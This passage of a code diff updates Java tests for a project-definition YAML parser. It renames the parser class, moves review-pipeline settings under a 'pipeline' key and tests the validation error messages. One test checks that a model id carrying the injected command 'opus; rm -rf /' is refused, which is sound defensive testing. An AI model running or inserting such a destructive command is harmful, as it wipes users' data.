-        "agent.review_pipeline.fix_skill is no longer read: a fix run reads the build's work"
-            + " prompt. Put what the skill said in the repo's AGENTS.md, or keep it as a project"
-            + " skill (sail project skills add). Then remove `agent.review_pipeline.fix_skill`"
-            + " from acme/sail.yaml.",
-        refusal(agent + "  review_pipeline:\n    fix_skill: acme-fix\n"));
-    assertEquals(
-        "agent.review_pipeline.stages[security].skill is no longer read: a stage judges under its"
-            + " brief. Put what the skill said in the stage's brief"
-            + " (agent.review_pipeline.stages[security].brief), or keep it as a project skill"
-            + " (sail project skills add) the brief tells the stage to run.",
-        refusal(
-            agent + "  review_pipeline:\n    stages:\n      - name: security\n        skill: x\n"));
-    assertEquals(
-        "agent.review_pipeline.stages[security].categories is no longer read: what a stage"
-            + " focuses on is its brief. Say it in agent.review_pipeline.stages[security].brief.",
-        refusal(
-            agent
-                + "  review_pipeline:\n    stages:\n      - name: security\n        categories: [a]\n"));
+        config.pipeline(),
+        reparsed.pipeline(),
+        "the section a pipeline writes parses back to the same pipeline, stages included");
   }
 
   @Test
   void aBriefIsTextOnAnAgentStageWithinThePromptBudget() {
-    var agent = "name: acme\nagent:\n  type: claude-code\n  review_pipeline:\n    stages:\n";
+    var agent = "name: acme\nagent:\n  type: claude-code\npipeline:\n  stages:\n";
 
     assertEquals(
-        "agent.review_pipeline.stages[sign-off].brief is set on a human stage; a person follows no"
+        "pipeline.stages[sign-off].brief is set on a human stage; a person follows no"
             + " brief, so remove it.",
-        refusal(agent + "      - name: sign-off\n        type: human\n        brief: Look.\n"));
+        refusal(agent + "    - name: sign-off\n      type: human\n      brief: Look.\n"));
     assertEquals(
-        "agent.review_pipeline.stages[review].brief is 32001 code points; the limit is 32000.",
-        refusal(agent + "      - name: review\n        brief: " + "x".repeat(32_001) + "\n"));
+        "pipeline.stages[review].brief is 32001 code points; the limit is 32000.",
+        refusal(agent + "    - name: review\n      brief: " + "x".repeat(32_001) + "\n"));
     assertEquals(
-        "agent.review_pipeline.stages[review].brief is blank; write it or remove it.",
-        refusal(agent + "      - name: review\n        brief: '  '\n"));
+        "pipeline.stages[review].brief is blank; write it or remove it.",
+        refusal(agent + "    - name: review\n      brief: '  '\n"));
     assertEquals(
-        "agent.review_pipeline.stages[review].brief must be text.",
-        refusal(agent + "      - name: review\n        brief: [a]\n"));
+        "pipeline.stages[review].brief must be text.",
+        refusal(agent + "    - name: review\n      brief: [a]\n"));
+    assertEquals(
+        "pipeline.stages[review].gate is 'never'; it is one of no_critical, no_critical_or_high,"
+            + " all_clear.",
+        refusal(agent + "    - name: review\n      gate: never\n"));
+    assertEquals(
+        "pipeline.stages[].skill is not a key of pipeline.stages[]. Its keys are: name, type,"
+            + " agent, gate, brief.",
+        refusal(agent + "    - name: review\n      skill: x\n"));
     var stage =
-        SailYaml.fromMap(YamlUtil.parseMap(agent + "      - name: review\n        brief: Judge.\n"))
-            .agent()
-            .reviewPipeline()
+        ProjectDefinition.fromMap(
+                YamlUtil.parseMap(agent + "    - name: review\n      brief: Judge.\n"))
+            .pipeline()
             .stages()
             .getFirst();
     assertEquals("Judge.", stage.brief());
@@ -950,7 +694,8 @@ class SailYamlTest {
 
   private static String refusal(String yaml) {
     return assertThrows(
-            IllegalArgumentException.class, () -> SailYaml.fromMap(YamlUtil.parseMap(yaml)))
+            IllegalArgumentException.class,
+            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)))
         .getMessage();
   }
 
@@ -960,25 +705,26 @@ class SailYamlTest {
         "name: acme\nrepos:\n  - url: https://git.example.com/org/api.git\n    path: api\n"
             + "    forge: github\n  - url: https://gitlab.com/org/web.git\n    path: web\n";
 
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertEquals("github", config.repos().getFirst().forge());
     assertNull(config.repos().getLast().forge());
-    assertEquals(config, SailYaml.fromMap(config.toMap()), "forge round-trips");
+    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "forge round-trips");
     assertEquals(
         "repos[].forge must be 'github' when set, got: gitlab",
         refusal(yaml.replace("forge: github", "forge: gitlab")));
     assertEquals(
-        "repos[].forge must be text when set.",
-        refusal(yaml.replace("forge: github", "forge: [a]")));
+        "repos[].forge must be text.", refusal(yaml.replace("forge: github", "forge: [a]")));
   }
 
   @Test
   void theProjectsMemberDefaultsToItsAgentWithFullAccess() {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  type: claude-code\n"));
+    var config =
+        ProjectDefinition.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  type: claude-code\n"));
 
     assertNull(config.agent().member());
-    assertEquals(new SailYaml.Member("claude-code", null, "full"), config.agent().projectMember());
+    assertEquals(
+        new ProjectDefinition.Member("claude-code", null, "full"), config.agent().projectMember());
     assertFalse(config.agent().toMap().containsKey("member"), "init writes no member key");
   }
 
@@ -988,12 +734,13 @@ class SailYamlTest {
         "name: acme\nagent:\n  type: claude-code\n  install: [claude-code, codex]\n"
             + "  member:\n    agent: codex\n    model: gpt-5-codex\n    mode: read_only\n";
 
-    var config = SailYaml.fromMap(YamlUtil.parseMap(yaml));
+    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
 
     assertEquals(
-        new SailYaml.Member("codex", "gpt-5-codex", "read_only"), config.agent().projectMember());
+        new ProjectDefinition.Member("codex", "gpt-5-codex", "read_only"),
+        config.agent().projectMember());
     assertEquals(List.of("claude-code", "codex"), config.agent().installs());
-    assertEquals(config, SailYaml.fromMap(config.toMap()), "member round-trips");
+    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "member round-trips");
   }
 
   @Test
@@ -1001,7 +748,7 @@ class SailYamlTest {
     var yaml = "name: acme\nagent:\n  type: claude-code\n  member:\n    agent: codex\n";
 
     assertEquals(
-        "agent.member.agent 'codex' is not a harness acme/sail.yaml installs (claude-code). Add"
+        "agent.member.agent 'codex' is not a harness the project installs (claude-code). Add"
             + " it to agent.install, or name one of those.",
         refusal(yaml));
   }
@@ -1011,14 +758,15 @@ class SailYamlTest {
     var yaml = "name: acme\nagent:\n  type: claude-code\n  install: [codex]\n";
 
     assertEquals(
-        "agent.member.agent 'claude-code' is not a harness acme/sail.yaml installs (codex). Add"
+        "agent.member.agent 'claude-code' is not a harness the project installs (codex). Add"
             + " it to agent.install, or name one of those.",
         refusal(yaml));
   }
 
   @Test
   void aDefinitionNamingNoAgentHasNoMember() {
-    var config = SailYaml.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  auto_branch: true\n"));
+    var config =
+        ProjectDefinition.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  auto_branch: true\n"));
 
     assertNull(config.agent().projectMember());
   }
@@ -1028,8 +776,7 @@ class SailYamlTest {
     var yaml = "name: acme\nagent:\n  member:\n    model: gpt-5-codex\n";
 
     assertEquals(
-        "agent.member.agent in acme/sail.yaml is unset and agent.type names no agent. Set one of"
-            + " them.",
+        "agent.member.agent is unset and agent.type names no agent. Set one of them.",
         refusal(yaml));
   }
 
@@ -1038,19 +785,18 @@ class SailYamlTest {
     var base = "name: acme\nagent:\n  type: claude-code\n  member:\n";
 
     assertEquals(
-        "agent.member.mode in acme/sail.yaml: Engagement mode must be 'full' or 'read_only', got"
-            + " 'admin'.",
+        "agent.member.mode: Engagement mode must be 'full' or 'read_only', got 'admin'.",
         refusal(base + "    mode: admin\n"));
     assertEquals(
-        "agent.member.model 'opus; rm -rf /' in acme/sail.yaml is not a model id. Use one without"
-            + " spaces or shell syntax.",
+        "agent.member.model 'opus; rm -rf /' is not a model id. Use one without spaces or shell"
+            + " syntax.",
         refusal(base + "    model: 'opus; rm -rf /'\n"));
   }
 
   @Test
   void aMembersLegacyReadOnlySpellingReadsAsTheWireForm() {
     var config =
-        SailYaml.fromMap(
+        ProjectDefinition.fromMap(
             YamlUtil.parseMap(
                 "name: acme\nagent:\n  type: claude-code\n  member:\n    mode: read-only\n"));
 
@@ -1060,24 +806,26 @@ class SailYamlTest {
   @Test
   void aBlankMemberFallsBackToEveryDefault() {
     var config =
-        SailYaml.fromMap(
+        ProjectDefinition.fromMap(
             YamlUtil.parseMap(
                 "name: acme\nagent:\n  type: codex\n  member:\n    agent: ''\n    model: ''\n"));
 
-    assertEquals(new SailYaml.Member("codex", null, "full"), config.agent().projectMember());
+    assertEquals(
+        new ProjectDefinition.Member("codex", null, "full"), config.agent().projectMember());
   }
 
   @Test
   void installsFallBackToTheAgentType() {
-    var none = new SailYaml.Agent(null, false, null, false, null, null, null, null);
-    var empty = new SailYaml.Agent("codex", false, null, false, List.of(), null, null, null);
+    var none = new ProjectDefinition.Agent(null, false, null, false, null, null, null, null);
+    var empty =
+        new ProjectDefinition.Agent("codex", false, null, false, List.of(), null, null, null);
 
     assertEquals(List.of(), none.installs());
     assertEquals(List.of("codex"), empty.installs());
   }
 
-  private static SailYaml withProcesses(String processes) {
-    return SailYaml.fromMap(
+  private static ProjectDefinition withProcesses(String processes) {
+    return ProjectDefinition.fromMap(
         YamlUtil.parseMap(
             "name: acme\nservices:\n  postgres:\n    image: postgres:16\n    ports: [5432]\nprocesses:\n"
                 + processes));
@@ -1106,36 +854,43 @@ class SailYamlTest {
 
     var web = config.processes().get("web");
     assertEquals(
-        new SailYaml.Process(
+        new ProjectDefinition.Process(
             "npm run dev", "app/web", 3000, Map.of("NODE_ENV", "development", "WORKERS", "2")),
         web);
     assertEquals(
-        new SailYaml.Process("node worker.js", null, null, Map.of()),
+        new ProjectDefinition.Process("node worker.js", null, null, Map.of()),
         config.processes().get("worker"));
-    assertEquals(config, SailYaml.fromMap(config.toMap()), "it survives a round trip");
+    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "it survives a round trip");
     assertEquals(Map.of("command", "node worker.js"), config.processes().get("worker").toMap());
   }
 
   @Test
   void aWorkdirIsAPathUnderTheWorkspaceWithOrWithoutDotSlash() {
-    assertEquals("", SailYaml.Process.inWorkspace("."));
-    assertEquals("", SailYaml.Process.inWorkspace("./"));
-    assertEquals("webapp", SailYaml.Process.inWorkspace("./webapp"));
-    assertEquals("a/b", SailYaml.Process.inWorkspace("././a/b"));
-    assertEquals("a/b", SailYaml.Process.inWorkspace("a/b"));
+    assertEquals("", ProjectDefinition.Process.inWorkspace("."));
+    assertEquals("", ProjectDefinition.Process.inWorkspace("./"));
+    assertEquals("webapp", ProjectDefinition.Process.inWorkspace("./webapp"));
+    assertEquals("a/b", ProjectDefinition.Process.inWorkspace("././a/b"));
+    assertEquals("a/b", ProjectDefinition.Process.inWorkspace("a/b"));
   }
 
   @Test
-  void aPortIsClaimedByOneProcessOrServiceOnly() {
+  void aPortIsClaimedByOneProcessOrServiceOnlyWhereADefinitionIsWrittenNotWhereItIsRead() {
+    var clash = withProcesses("  web:\n    command: x\n    port: 5432\n");
+    var twice =
+        withProcesses(
+            "  web:\n    command: x\n    port: 3000\n  admin:\n    command: y\n    port: 3000\n");
+    var sound = withProcesses("  web:\n    command: x\n    port: 3000\n");
+
     assertEquals(
         "Port 5432 is claimed by both service 'postgres' and process 'web'. Give one of them another"
             + " port.",
-        processRefusal("  web:\n    command: x\n    port: 5432\n"));
+        assertThrows(IllegalArgumentException.class, () -> ProjectDefinitionJson.validated(clash))
+            .getMessage());
     assertEquals(
         "Port 3000 is claimed by both process 'web' and process 'admin'. Give one of them another"
             + " port.",
-        processRefusal(
-            "  web:\n    command: x\n    port: 3000\n  admin:\n    command: y\n    port: 3000\n"));
+        assertThrows(IllegalArgumentException.class, twice::requirePortsClaimedOnce).getMessage());
+    assertSame(sound, sound.requirePortsClaimedOnce());
   }
 
   @Test
@@ -1175,5 +930,78 @@ class SailYamlTest {
     assertEquals(
         "Invalid process name: 'my app'. Must match [a-zA-Z0-9][a-zA-Z0-9._-]*, max 63 characters.",
         processRefusal("  my app:\n    command: x\n"));
+  }
+
+  @Test
+  void aDefinitionHoldsItsNameAndItsSectionsAndNothingElse() {
+    assertEquals(
+        "git is not a key of a project definition. Its keys are: name, description, image,"
+            + " resources, runtimes, repos, services, processes, packages, agent, pipeline.",
+        refusal("name: acme\ngit:\n  name: Ada\n"));
+    assertEquals(
+        "ssh is not a key of a project definition. Its keys are: name, description, image,"
+            + " resources, runtimes, repos, services, processes, packages, agent, pipeline.",
+        refusal("name: acme\nssh:\n  user: dev\n"));
+    assertEquals(
+        "agent.review_pipeline is not a key of agent. Its keys are: type, auto_branch,"
+            + " branch_prefix, auto_snapshot, install, config, guardrails, notifications, member.",
+        refusal("name: acme\nagent:\n  type: claude-code\n  review_pipeline: {}\n"));
+    assertEquals(
+        "resources.cpus is not a key of resources. Its keys are: cpu, memory, disk.",
+        refusal("name: acme\nresources:\n  cpus: 4\n"));
+    assertEquals("name is required: the project's name.", refusal("description: x\n"));
+  }
+
+  @Test
+  void aValueOfTheWrongTypeIsRefusedNamingItsField() {
+    assertEquals("resources.cpu must be a whole number.", refusal(resources("'4'", "8GB")));
+    assertEquals(
+        "resources.cpu is required: a whole number of cores, 1 or more.",
+        refusal(resources("0", "8GB")));
+    assertEquals(
+        "resources.memory is required: a size such as \"8GB\".", refusal(resources("4", "[a]")));
+    assertEquals("description must be text.", refusal("name: acme\ndescription: [a]\n"));
+    assertEquals("packages[1] must be text.", refusal("name: acme\npackages: [git, 3]\n"));
+    assertEquals(
+        "agent.auto_branch must be true or false.",
+        refusal("name: acme\nagent:\n  auto_branch: yes please\n"));
+    assertEquals("services must be a block of keys.", refusal("name: acme\nservices: [a]\n"));
+    assertEquals("repos[0] must be a block of keys.", refusal("name: acme\nrepos: [a]\n"));
+    assertEquals(
+        "services.db.ports[0] must be a whole number.",
+        refusal("name: acme\nservices:\n  db:\n    image: postgres:16\n    ports: [x]\n"));
+    assertEquals(
+        "services.db.image is required: the image it runs.",
+        refusal("name: acme\nservices:\n  db:\n    ports: [5432]\n"));
+    assertEquals(
+        "runtimes.node must be a version such as 24.",
+        refusal("name: acme\nruntimes:\n  node: [24]\n"));
+    assertEquals(
+        "pipeline.max_iterations must be 1 or more.",
+        refusal("name: acme\npipeline:\n  max_iterations: 0\n"));
+  }
+
+  private static String resources(String cpu, String memory) {
+    return "name: acme\nresources:\n  cpu: " + cpu + "\n  memory: " + memory + "\n  disk: 50GB\n";
+  }
+
+  @Test
+  void aSectionIsNamedByItsKeyAndAnyOtherNameIsRefusedListingThem() {
+    for (var section : ProjectDefinition.Section.values()) {
+      assertEquals(section, ProjectDefinition.Section.of(section.key()));
+    }
+    assertEquals(
+        "'git' is not a section of a project definition. The sections are: description, image,"
+            + " resources, runtimes, repos, services, processes, packages, agent, pipeline.",
+        assertThrows(IllegalArgumentException.class, () -> ProjectDefinition.Section.of("git"))
+            .getMessage());
+  }
+
+  @Test
+  void everyAgentShellAndHookRunsAsDev() {
+    assertEquals("dev", ProjectDefinition.USER);
+    assertEquals(
+        List.of("/home/dev/workspace/acme-backend", "/home/dev/workspace/acme-webapp"),
+        ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML)).repoPaths());
   }
 }
